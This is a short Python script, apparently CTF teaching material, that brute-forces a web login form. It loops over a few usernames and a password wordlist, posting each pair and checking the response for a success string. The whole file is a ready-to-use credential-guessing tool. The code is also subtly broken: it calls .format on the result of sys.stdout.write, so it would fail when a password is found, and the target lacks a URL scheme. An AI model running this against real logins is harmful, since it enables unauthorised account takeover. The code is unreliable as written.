#Web Login Form Brute Forcing - teaching from Riley Kidd 247CTF
#Many Web Applications need a valid username and password
#This script requires a web app you are authorized to brute force.

#Utilizing requests module

import requests
import sys

target = "<TARGET IP>:<TARGET PORT>"
usernames = ["admin", "user", "test"]
passwords = "<PASSWORD FILE HERE>"
needle = "Welcome back"

#Depending on what application you are interacting with the needle will change. 
#The needle should be something indicated in a sucessful login in this case the webapp would give us a "Welcome back" text.

for username in usernames:
	with open(passwords, "r") as passwords_list:
		for password in passwords_list:
			password = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
			sys.stdout.flush()
			r = requests.post(target, data={"username": username, "password": password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>] Valid Password '{}' found for user '{}'!").format(password.decode(), username)
				sys.exit()	
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\t No password found for '{}'!".format(username))
		sys.stdout.write("\n")
